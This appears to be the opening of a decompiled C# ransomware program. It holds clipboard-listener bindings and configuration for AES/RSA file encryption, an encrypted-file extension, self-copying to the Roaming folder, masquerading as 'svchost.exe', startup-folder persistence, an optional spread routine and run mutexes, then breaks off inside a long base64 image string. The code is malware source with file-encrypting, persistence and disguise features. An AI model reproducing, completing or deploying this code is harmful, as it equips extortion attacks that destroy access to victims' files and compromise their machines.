using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = false;

	private static string spreadName = "surprise";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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